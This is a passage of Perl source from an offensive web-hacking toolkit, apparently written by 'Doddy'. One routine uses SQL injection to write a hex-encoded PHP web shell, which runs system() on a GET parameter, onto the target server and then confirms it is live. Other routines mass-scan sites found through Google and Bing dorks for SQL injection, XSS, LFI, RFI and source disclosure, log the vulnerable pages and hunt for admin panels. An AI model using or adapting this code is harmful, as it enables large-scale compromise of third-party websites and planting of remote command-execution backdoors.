                          . $_[3]
                          . $pass1 . "limit"
                          . $pass1
                          . $limit . ",1"
                          . $pass2 );
                    if ( $injection =~ /ERTOR854(.*)ERTOR854(.*)ERTOR854/ig ) {
                        savefilear( $_[5] . ".txt",
                            "[$_[1]] : $1   [$_[2]] : $2" );
                        printear(
                            "[$_[1]] : $1   [$_[2]] : $2\n", "text",
                            "7",                             "5"
                        );
                    }
                    else {
                        printear( "\n[+] Extracting Finish\n",
                            "text", "13", "5" );
                        &reload;
                    }
                }
            }
            else {
                printear( "[-] Not Found any DATA\n\n", "text", "5", "5" );
            }
        }
    }

    sub into {
        printear( "\n[Status] : Injecting a SQLI for create a shell\n",
            "text", "13", "5" );
        my ( $page, $bypass, $dir, $save ) = @_;
        savefilear( $save . ".txt", "\n" );
        print "\n";
        ( $pass1, $pass2 ) = &bypass($bypass);
        my ( $scheme, $auth, $path, $query, $frag ) = uri_split($page);
        if ( $path =~ /\/(.*)$/ ) {
            my $path1 = $1;
            my $path2 = $path1;
            $path2 =~ s/$1//;
            $dir   =~ s/$path1//ig;
            $shell = $dir . "/" . "shell.php";
            if ( $page =~ /(.*)hackman(.*)/ig ) {
                my ( $start, $end ) = ( $1, $2 );
                $code =
                  toma( $start
                      . "0x3c7469746c653e4d696e69205368656c6c20427920446f6464793c2f7469746c653e3c3f7068702069662028697373657428245f4745545b27636d64275d2929207b2073797374656d28245f4745545b27636d64275d293b7d3f3e"
                      . $end
                      . $pass1 . "into"
                      . $pass1
                      . "outfile"
                      . $pass1 . "'"
                      . $shell . "'"
                      . $pass2 );
                $code1 =
                  toma( "http://" . $auth . "/" . $path2 . "/" . "shell.php" );
                if ( $code1 =~ /Mini Shell By Doddy/ig ) {
                    printear(
                        "[Shell Up] : http://" 
                          . $auth . "/" 
                          . $path2 . "/"
                          . "shell.php" . "\a\a",
                        "text", "7", "5"
                    );
                    savefilear(
                        $save . ".txt",
                        "[shell up] : http://" 
                          . $auth . "/" 
                          . $path2 . "/"
                          . "shell.php"
                    );
                }
                else {
                    printear( "[Shell] : Not Found", "text", "5", "5" );
                }
            }
        }
    }

}    ##

sub load_paranoic_old {

    installer_par();
    staq();

    sub staq {

        sub head_scan {
            clean();
            printear( "


  @@@    @@@@    @    @    @  @    @  @@@@@  @@@@@ 
 @   @  @    @   @    @@   @  @@   @  @      @    @
 @      @       @ @   @@   @  @@   @  @      @    @
 @      @       @ @   @ @  @  @ @  @  @      @    @
  @@@   @      @   @  @ @  @  @ @  @  @@@@   @@@@@ 
     @  @      @   @  @  @ @  @  @ @  @      @    @
     @  @      @@@@@  @   @@  @   @@  @      @    @
 @   @  @    @@     @ @   @@  @   @@  @      @    @
  @@@    @@@@ @     @ @    @  @    @  @@@@@  @    @




", "logos", "7", "5" );
        }

        &menu_sca;

        sub menu_sca {
            &head_scan;
            printear( "[a] : Scan a File\n", "text", "13", "5" );
            printear(
                "[b] : Search in Google and scan the webs\n", "text",
                "13",                                         "5"
            );
            printear(
                "[c] : Search in Bing and scan the webs\n", "text",
                "13",                                       "5"
            );
            printear( "[d] : Exit\n\n", "text", "13", "5" );
            my $op = printear( "[option] : ", "stdin", "11", "13" );

            scan($op);

        }

        sub scan {

            my $count;
            my $option;
            my $op = shift;
            my @paginas;

            if ( $op =~ /a/ig ) {

                my $word = printear( "\n[+] Wordlist : ", "stdin", "11", "13" );

                @paginas = repes( cortar( savewordss($word) ) );

                $option = &men;

                if ( $option =~ /Q/ig ) {
                    $count =
                      printear( "\n[+] Panels Count : ", "stdin", "11", "13" );
                }

            }

            elsif ( $op =~ /b/ig ) {

                my $dork = printear( "\n[+] Dork : ",  "stdin", "11", "13" );
                my $pag  = printear( "\n[+] Pages : ", "stdin", "11", "13" );
                $option = &men;

                if ( $option =~ /Q/ig ) {
                    $count =
                      printear( "\n[+] Panels Count : ", "stdin", "11", "13" );
                }

                printear( "\n[+] Searching in Google ...\n", "text", "13",
                    "5" );

                @paginas = &google( $dork, $pag );

            }

            elsif ( $op =~ /c/ig ) {
                my $dork = printear( "\n[+] Dork : ",  "stdin", "11", "13" );
                my $pag  = printear( "\n[+] Pages : ", "stdin", "11", "13" );
                $option = &men;

                if ( $option =~ /Q/ig ) {
                    $count =
                      printear( "\n[+] Panels Count : ", "stdin", "11", "13" );
                }

                printear( "\n[+] Searching in Bing ...\n", "text", "13", "5" );

                @paginas = &bing( $dork, $pag );

            }

            elsif ( $op =~ /d/ig ) {
                estoydentroporahora();
            }

            else {
                &finish_now;
            }

            printear( "\n[+] Scanning [" . int(@paginas) . "] pages ...\n\n",
                "text", "7", "5" );

            $total_vulnerables = "0";

            for (@paginas) {
                if ( $option =~ /S/ig ) {
                    scansql($_);
                }
                if ( $option =~ /K/ig ) {
                    sql($_);
                }
                if ( $option =~ /Q/ig ) {
                    sqladmin( $_, $count );
                }
                if ( $option =~ /Y/ig ) {
                    simple($_);
                }
                if ( $option =~ /L/ig ) {
                    lfi($_);
                }
                if ( $option =~ /R/ig ) {
                    rfi($_);
                }
                if ( $option =~ /F/ig ) {
                    fsd($_);
                }
                if ( $option =~ /X/ig ) {
                    scanxss($_);
                }
                if ( $option =~ /M/ig ) {
                    mssql($_);
                }
                if ( $option =~ /J/ig ) {
                    access($_);
                }
                if ( $option =~ /O/ig ) {
                    oracle($_);
                }
                if ( $option =~ /HT/ig ) {
                    http($_);
                }
                if ( $option =~ /A/ig ) {
                    scansql($_);
                    scanxss($_);
                    mssql($_);
                    access($_);
                    oracle($_);
                    lfi($_);
                    rfi($_);
                    fsd($_);
                    http($_);
                }
            }
        }
        printear( "\n[+] Vulnerable pages found : " . $total_vulnerables . "\n",
            "text", "13", "5" );
        &finish_now;
    }

    sub sql {
        my ( $pass1, $pass2 ) = ( "+", "--" );
        my $page = shift;
        $code1 =
          toma( $page . "-1" 
              . $pass1 . "union" 
              . $pass1 
              . "select" 
              . $pass1 . "666"
              . $pass2 );
        if ( $code1 =~
            /The used SELECT statements have a different number of columns/ig )
        {
            printear( "[+] SQLI : $page\a\n", "text", "11", "5" );
            $total_vulnerables++;
            savefile( "sql-logs.txt", $page );
        }
    }

    sub sqladmin {

        my ( $pass1, $pass2 ) = ( "+", "--" );

        my $page   = $_[0];
        my $limite = $_[1];

        if ( $limite eq "" ) {
            $limite = 3;
        }

        $code1 =
          toma( $page . "-1" 
              . $pass1 . "union" 
              . $pass1 
              . "select" 
              . $pass1 . "666"
              . $pass2 );
        if ( $code1 =~
            /The used SELECT statements have a different number of columns/ig )
        {
            printear( "\n[+] SQLI : $page\a\n", "text", "11", "5" );
            $total_vulnerables++;
            savefile( "sql-logs.txt", $page );

            my ( $scheme, $auth, $path, $query, $frag ) = uri_split($page);

            my $fage = "http://" . $auth;

            my $count = 0;

            for my $path (@paneles) {

                if ( $count eq $limite ) {
                    last;
                }

                $code = tomados( $fage . "/" . $path );

                if ( $code->is_success ) {
                    $controlt = 1;
                    $count++;
                    printear(
                        "[+] Link : " . $fage . "/" . $path . "\n", "text",
                        "11",                                       "5"
                    );
                    savefile( "admin-logs.txt", $fage . "/" . $path );
                }
            }
        }

    }

    sub http {

        my ( $scheme, $auth, $path, $query, $frag ) = uri_split( $_[0] );

        my $code = $nave->get( $_[0] );

        if ( $_[0] =~ /http:\/\// ) {

            printear( "\n[+] Page : $auth", "text", "11", "5" );
            printear( "\n[+] Date : " . $code->header('date'),
                "text", "11", "5" );
            printear(
                "\n[+] Server : " . $code->header('server'), "text",
                "11",                                        "5"
            );
            printear( "\n[+] Connection : " . $code->header('connection'),
                "text", "11", "5" );
            printear(
                "\n[+] Content-Type : " . $code->header('content-type') . "\n",
                "text", "11", "5"
            );

            savefile( "http-logs.txt", "\n[+] Page : $auth" );
            savefile( "http-logs.txt", "[+] Date : " . $code->header('date') );
            savefile( "http-logs.txt",
                "[+] Server : " . $code->header('server') );
            savefile( "http-logs.txt",
                "[+] Connection : " . $code->header('connection') );
            savefile( "http-logs.txt",
                "[+] Content-Type : " . $code->header('content-type') );

        }

    }

    sub scanxss {

        my $page = $_[0];
        my $espacio_scan;
        chomp $page;

        if ( $_[1] eq "yes" ) {
            $espacio_scan = "\n";
        }

        my @testar = HTML::Form->parse( toma($page), "/" );
        my @botones_names;
        my @botones_values;
        my @orden;
        my @pa = (
"<script>alert(String.fromCharCode(101,115,116,111,121,100,101,110,117,101,118,111,101,110,101,115,116,111))</script>",
'"><script>alert(String.fromCharCode(101,115,116,111,121,100,101,110,117,101,118,111,101,110,101,115,116,111))</script>'
        );
        my @get_founds;
        my @post_founds;
        my @ordenuno;
        my @ordendos;
        my @valores;

        my $contador_forms = 0;

        my $valor = "doddyhackman";

        for my $test (@testar) {
            $contador_forms++;
            if ( $test->method eq "POST" ) {
                my @inputs = $test->inputs;
                for my $in (@inputs) {
                    if ( $in->type eq "submit" ) {
                        if ( $in->name eq "" ) {
                            push( @botones_names, "submit" );
                        }
                        push( @botones_names,  $in->name );
                        push( @botones_values, $in->value );
                    }
                    else {
                        push( @ordenuno, $in->name, $pa[0] );
                        push( @valores,  $in->name );
                        push( @ordendos, $in->name );
                    }
                }

                for my $n ( 0 .. int(@botones_names) - 1 ) {
                    my @preuno = @ordenuno;
                    my @predos = @ordendos;
                    push( @preuno, $botones_names[$n], $botones_values[$n] );
                    push( @predos, $botones_names[$n], $botones_values[$n] );

                    my $codeuno = $nave->post( $page, \@preuno )->content;
                    my $codedos = $nave->post( $page, \@predos )->content;
                    if ( $codeuno =~
/<script>alert\(String.fromCharCode\(101,115,116,111,121,100,101,110,117,101,118,111,101,110,101,115,116,111\)\)<\/script>/ig
                        or $codedos =~
/<script>alert\(String.fromCharCode\(101,115,116,111,121,100,101,110,117,101,118,111,101,110,101,115,116,111\)\)<\/script>/ig
                      )
                    {
                        if (   $test->attr(name) eq ""
                            or $test->attr(name) eq " " )
                        {
                            push( @post_founds, $contador_forms );
                        }
                        else {
                            push( @post_founds, $test->attr(name) );
                        }
                    }
                }
            }
            else {    #Fin de metodo POST
                my @inputs = $test->inputs;
                for my $in (@inputs) {
                    if ( $in->type eq "submit" ) {
                        if ( $in->name eq "" ) {
                            push( @botones_names, "submit" );
                        }
                        push( @botones_names,  $in->name );
                        push( @botones_values, $in->value );
                    }
                    else {
                        $orden .= '' . $in->name . '=' . $valor . '&';
                    }
                }
                chop($orden);
                for my $n ( 0 .. int(@botones_names) - 1 ) {
                    my $partedos =
                      "&" . $botones_names[$n] . "=" . $botones_values[$n];
                    my $final = $orden . $partedos;
                    for my $strin (@pa) {
                        chomp $strin;
                        $final =~ s/doddyhackman/$strin/;
                        $code = toma( $page . "?" . $final );
                        my $strin = "\Q$strin\E";
                        if ( $code =~ /$strin/ ) {
                            push( @get_founds, $page . "?" . $final );
                        }
                    }
                }
            }
        }

        my @get_founds = repes(@get_founds);
        if ( int(@get_founds) ne 0 ) {
            for (@get_founds) {
                $total_vulnerables++;
                savefile( "xss-logs.txt", "[+] XSS Found : $_" );
                printear( $espacio_scan . "[+] XSS Found : $_\n\a",
                    "text", "11", "5" );
            }
        }

        my @post_founds = repes(@post_founds);
        if ( int(@post_founds) ne 0 ) {
            for my $t (@post_founds) {
                if ( $t =~ /^\d+$/ ) {
                    $total_vulnerables++;
                    savefile( "xss-logs.txt", "[+] XSS : Form $t in $page" );
                    printear(
                        "\n[+] XSS : Form $t in $page\n\a", "text",
                        "11",                               "5"
                    );

                }
            }
            printear( "[+] Values : @valores \n", "text", "11", "5" );
        }
    }

    sub simple {

        my $code  = toma( $_[0] );
        my @links = get_links($code);

        for my $com (@links) {
            my ( $scheme, $auth, $path, $query, $frag ) = uri_split( $_[0] );
            if ( $path =~ /\/(.*)$/ ) {
                my $path1 = $1;
                $_[0] =~ s/$path1//ig;
                my ( $scheme, $auth, $path, $query, $frag ) = uri_split($com);
                if ( $path =~ /(.*)\// ) {
                    my $parche = $1;
                    unless ( $repetidos =~ /$parche/ ) {
                        $repetidos .= " " . $parche;
                        my $code = toma( "http://" . $auth . $parche );
                        if ( $code =~ /Index of (.*)</ig ) {
                            my $dir_found = $1;
                            chomp $dir_found;
                            $total_vulnerables++;
                            printear(
                                "[+] Directory Found : "
                                  . "http://"
                                  . $auth
                                  . $parche . "\n",
                                "text", "11", "5"
                            );
                            savefile( "paths-logs.txt",
                                    "[+] Directory Found : "
                                  . "http://"
                                  . $auth
                                  . $parche );
                        }
                    }
                }
            }
        }
    }

    sub scansql {

        my $page  = shift;
        my $copia = $page;

        $co = toma( $page . "'" );

        if ( $co =~
/supplied argument is not a valid MySQL result resource in <b>(.*)<\/b> on line /ig
            || $co =~ /mysql_free_result/ig
            || $co =~ /mysql_fetch_assoc/ig
            || $co =~ /mysql_num_rows/ig
            || $co =~ /mysql_fetch_array/ig
            || $co =~ /mysql_fetch_assoc/ig
            || $co =~ /mysql_query/ig
            || $co =~ /mysql_free_result/ig
            || $co =~ /equivocado en su sintax/ig
            || $co =~ /You have an error in your SQL syntax/ig
            || $co =~ /Call to undefined function/ig )
        {
            savefile( "sql-logs.txt", "[+] SQL : $page" );
            $total_vulnerables++;
            printear( "[+] SQLI : $page\a\n", "text", "11", "5" );
        }
        else {

            if ( $page =~ /(.*)\?(.*)/ ) {
                my $page = $1;

                my @testar = HTML::Form->parse( toma($page), "/" );
                my @botones_names;
                my @botones_values;
                my @orden;
                my @get_founds;
                my @post_founds;
                my @ordenuno;
                my @ordendos;

                my $contador_forms = 0;

                my $valor = "doddyhackman";

                for my $test (@testar) {
                    $contador_forms++;
                    if ( $test->method eq "POST" ) {
                        my @inputs = $test->inputs;
                        for my $in (@inputs) {
                            if ( $in->type eq "submit" ) {
                                if ( $in->name eq "" ) {
                                    push( @botones_names, "submit" );
                                }
                                push( @botones_names,  $in->name );
                                push( @botones_values, $in->value );
                            }
                            else {
                                push( @ordenuno, $in->name, "'" );
                            }
                        }

                        for my $n ( 0 .. int(@botones_names) - 1 ) {
                            my @preuno = @ordenuno;
                            push( @preuno,
                                $botones_names[$n], $botones_values[$n] );
                            my $code = $nave->post( $page, \@preuno )->content;
                            if ( $code =~
/supplied argument is not a valid MySQL result resource in <b>(.*)<\/b> on line /ig
                                || $code =~ /mysql_free_result/ig
                                || $code =~ /mysql_fetch_assoc/ig
                                || $code =~ /mysql_num_rows/ig
                                || $code =~ /mysql_fetch_array/ig
                                || $code =~ /mysql_fetch_assoc/ig
                                || $code =~ /mysql_query/ig
                                || $code =~ /mysql_free_result/ig
                                || $code =~ /equivocado en su sintax/ig
                                || $code =~
                                /You have an error in your SQL syntax/ig
                                || $code =~ /Call to undefined function/ig )
                            {
                                if (   $test->attr(name) eq ""
                                    or $test->attr(name) eq " " )
                                {
                                    push( @post_founds, $contador_forms );
                                }
                                else {
                                    push( @post_founds, $test->attr(name) );
                                }
                            }
                        }
                    }

                    my @post_founds = repes(@post_founds);
                    if ( int(@post_founds) ne 0 ) {
                        for my $t (@post_founds) {
                            if ( $t =~ /^\d+$/ ) {
                                $total_vulnerables++;
                                savefile( "sql-logs.txt",
                                    "[+] SQLI : Form $t in $page" );
                                printear(
                                    "[+] SQLI : Form $t in $page\n\a", "text",
                                    "11",                              "5"
                                );
                            }
                        }
                    }
                }
            }
        }
    }

    sub access {

        my $page = shift;
        $code1 = toma( $page . "'" );
        if (   $code1 =~ /Microsoft JET Database/ig
            or $code1 =~ /ODBC Microsoft Access Driver/ig )
        {
            printear( "[+] Jet DB : $page\a\n", "text", "11", "5" );
            savefile( "jetdb-logs.txt", $page );
            $total_vulnerables++;
        }
    }

    sub mssql {

        my $page = shift;
        $code1 = toma( $page . "'" );
        if ( $code1 =~ /ODBC SQL Server Driver/ig ) {
            printear( "[+] MSSQL : $page\a\n", "text", "11", "5" );
            savefile( "mssql-logs.txt", $page );
            $total_vulnerables++;
        }
    }

    sub oracle {

        my $page = shift;
        $code1 = toma( $page . "'" );
        if ( $code1 =~ /Microsoft OLE DB Provider for Oracle/ig ) {
            printear( "[+] Oracle : $page\a\n", "text", "11", "5" );
            savefile( "oracle-logs.txt", $page );
            $total_vulnerables++;
        }
    }

    sub rfi {
        my $page = shift;
        $code1 = toma( $page . "http:/www.supertangas.com/" );
        if ( $code1 =~ /Los mejores TANGAS de la red/ig )
        {    #Esto es conocimiento de verdad xDDD
            printear( "[+] RFI : $page\a\n", "text", "11", "5" );
            savefile( "rfi-logs.txt", $page );
            $total_vulnerables++;
        }
    }

    sub lfi {
        my $page = shift;
        $code1 = toma( $page . "'" );
        if ( $code1 =~ /No such file or directory in <b>(.*)<\/b> on line/ig ) {
            printear( "[+] LFI : $page\a\n", "text", "11", "5" );
            savefile( "lfi-logs.txt", $page );
            $total_vulnerables++;
        }
    }

    sub fsd {

        my $page = shift;
        my $archivo;

        if ( $page =~ /(.*)\/(.*)\?/ ) {
            $archivo = $2;
        }

        my $code = toma( $page . $archivo );

        if ( $code =~ /header\((.*)Content-Disposition: attachment;/ig ) {

            printear( "[+] Full Source Discloure : $page\a\n",
                "text", "11", "5" );
            $total_vulnerables++;
            savefile( "fpd-logs.txt", $page );

        }

    }

    sub men {
        printear( "\n[+] Scan Type : \n", "text", "5", "5" );
        printear( "
[X] : XSS
[S] : SQL GET/POST
[K] : SQL GET
[Q] : SQL GET + Admin
[Y] : Directory listing
[M] : MSSQL
[J] : Jet Database
[O] : Oracle
[L] : LFI
[R] : RFI
[F] : Full Source Discloure
[HT] : HTTP Information
[A] : All
", "logos", "13", "5" );
        my $option = printear( "\n[Options] : ", "stdin", "11", "13" );
        return $option;
    }

    sub finish_now {
        adios();
    }

    sub bing {

        my ( $a, $b ) = @_;
        for ( $pages = 10 ; $pages <= $b ; $pages = $pages + 10 ) {
            my $code =
              toma( "http://www.bing.com/search?q=" . $a . "&first=" . $pages );

            while ( $code =~ /<h3><a href="(.*?)"/mig ) {
                push( @founds, $1 );
            }
        }
        my @founds = repes( cortar(@founds) );
        return @founds;
    }

    sub google {
        my ( $a, $b ) = @_;
        my @founds;
        for ( $pages = 10 ; $pages <= $b ; $pages = $pages + 10 ) {
            $code =
              toma( "http://www.google.com.ar/search?hl=&q=" 
                  . $a
                  . "&start=$pages" );
            while ( $code =~ /(?<="r"><. href=")(.+?)"/mig ) {
                my $url = $1;
                if ( $url =~ /\/url\?q\=(.*?)\&amp\;/ ) {
                    push( @founds, uri_unescape($1) );
                }
            }
        }
        my @founds = repes( cortar(@founds) );
        return @founds;
    }

}    ##

sub load_cmd {

    head_console();

    sub head_console {
        clean();
        printear( "


  @@@@   @@@@   @    @   @@@    @@@@   @     @@@@@
 @    @ @    @  @@   @  @   @  @    @  @     @    
 @      @    @  @@   @  @      @    @  @     @    
 @      @    @  @ @  @  @      @    @  @     @    
 @      @    @  @ @  @   @@@   @    @  @     @@@@ 
 @      @    @  @  @ @      @  @    @  @     @    
 @      @    @  @   @@      @  @    @  @     @    
 @    @ @    @  @   @@  @   @  @    @  @     @    
  @@@@   @@@@   @    @   @@@    @@@@   @@@@@ @@@@@



", "logos", "7", "5" );
    }

    while (1) {
        my $cmd = printear( "\n[+] Command : ", "stdin", "11", "13" );
        print "\n";
        if ( $cmd eq "exit" ) {
            adios();
        }
        else {
            my $data = getdatanownownownow();
            if ( $data =~ /colors=n/ ) {
                system($cmd);
            }
            else {
                cprint "\x037";
                system($cmd);
                cprint "\x030";
            }
        }
    }

}    ##

##

##Funciones secundarias ###

sub toma {
    return $nave->get( $_[0] )->content;
}

sub tomados {
    return $nave->get( $_[0] );
}

sub tomar {
    my ( $web, $var ) = @_;
    return $nave->post( $web, [ %{$var} ] )->content;
}

sub ver_length {
    return true if length( $_[0] ) == 32;
}

sub savefile {
    open( SAVE, ">>logs/" . $_[0] );
    print SAVE $_[1] . "\n";
    close SAVE;
}

sub get_links {

    $test = HTML::LinkExtor->new( \&agarrar )->parse( $_[0] );
    return @links;

    sub agarrar {
        my ( $a, %b ) = @_;
        push( @links, values %b );
    }
}

sub adios {
    printear( "\n[+] Press the enter key to return to main menu\n",
        "text", "13", "5" );
    <stdin>;
    estoydentro();
}

sub savefilear {
    open( SAVE, ">>logs/webs/" . $_[0] );
    print SAVE $_[1] . "\n";
    close SAVE;
}

sub partimealmedio {
    my ( $scheme, $auth, $path, $query, $frag ) = uri_split( $_[0] );
    my $save = $auth;
    $save =~ s/:/_/;
    return $save;
}

sub encode {
    my $string = $_[0];
    $hex = '0x';
    for ( split //, $string ) {
        $hex .= sprintf "%x", ord;
    }
    return $hex;
}

sub decode {
    $_[0] =~ s/^0x//;
    $encode = join q[], map { chr hex } $_[0] =~ /../g;
    return $encode;
}

sub bypass {
    if    ( $_[0] eq "/*" )  { return ( "/**/", "/**/" ); }
    elsif ( $_[0] eq "%20" ) { return ( "%20",  "%00" ); }
    else                     { return ( "+",    "--" ); }
}

sub ascii {
    return join ',', unpack "U*", $_[0];
}

sub ascii_de {
    $_[0] = join q[], map { chr } split q[,], $_[0];
    return $_[0];
}

sub installer_kobra {
    unless ( -d "/logs/webs" ) {
        mkdir( "logs/",      777 );
        mkdir( "logs/webs/", 777 );
    }
}

sub cortar {
    my @nuevo;
    for (@_) {
        if ( $_ =~ /=/ ) {
            @tengo = split( "=", $_ );
            push( @nuevo, @tengo[0] . "=" );
        }
        else {
            push( @nuevo, $_ );
        }
    }
    return @nuevo;
}

sub installer_par {
    unless ( -d "logs/" ) {
        mkdir( "logs/", "777" );
    }
}

sub repes {
    my @limpio;
    foreach $test (@_) {
        push @limpio, $test unless $repe{$test}++;
    }
    return @limpio;
}

sub nombre {
    my ( $scheme, $auth, $path, $query, $frag ) = uri_split( $_[0] );
    return $auth;
}

sub savewordss {
    my @r;
    my @words;
    open( FILE, $_[0] );
    @words = <FILE>;
    close FILE;
    for (@words) {
        push( @r, $_ );
    }
    return (@r);
}

sub savewords {

    open my $on, '<', $_[0];
    undef $/;
    my $contenido = <$on>;
    close $on;

    return $contenido;

}

sub borrar_archivos {

    opendir my ($list), $_[0];
    my @aborrar = readdir $list;
    closedir $list;

    for my $borrar (@aborrar) {
        if ( -f $_[0] . "/" . $borrar ) {
            unlink( $_[0] . "/" . $borrar );
        }
    }

}

sub getdatanownownownow {
    open my $FILE, q[<], "data.txt";
    my $word = join q[], <$FILE>;
    close $FILE;
    return $word;
}

sub savefil {
    open( SAVE, ">>" . $_[0] );
    print SAVE $_[1];
    close SAVE;
}

sub cargarlogs {
    my $os = $^O;
    if ( $os =~ /Win/ig ) {
        system( "start " . $_[0] );
    }
    else {
        system( "firefox " . $_[0] );
    }
}

sub system_leida {
    my $os = $^O;
    if ( $os =~ /Win/ig ) {
        system( "start " . $_[0] );
    }
    else {
        system( "gedit " . $_[0] );
    }
}

##

#The End ?